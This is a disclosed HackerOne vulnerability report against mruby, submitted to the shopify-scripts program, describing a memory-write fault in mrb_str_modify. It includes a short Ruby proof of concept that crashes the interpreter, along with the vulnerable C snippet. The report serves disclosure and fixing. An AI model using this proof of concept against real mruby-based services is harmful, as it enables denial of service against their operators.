# mrb_str_modify try to write to memory not marked for writing

## Report Details
- **Report ID**: 193077
- **URL**: https://hackerone.com/reports/193077
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-12-21T14:34:40.465Z
- **Disclosed**: 2017-02-06T22:33:47.458Z

## Reporter
- **Username**: marotagem_vrt
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: shopify-scripts

## Vulnerability Information
The proof-of-concept below can be used to crash the interpreter (DoS) because forces it to try to write a memory not marked for writing.
```
a = Time.new.zone
a.rstrip!
GC.start
a.next!
```

Code
https://github.com/mruby/mruby/blob/5289b4ba117e66bdef1438ca754c894508a2447b/src/string.c#L668
```
    if (shared->refcnt == 1 && s->as.heap.ptr == shared->ptr) {
      s->as.heap.ptr = shared->ptr;
      s->as.heap.aux.capa = shared->len;
      RSTR_PTR(s)[s->as.heap.len] = '\0';
      mrb_free(mrb, shared);
    }
```   

## Attachments
No attachments
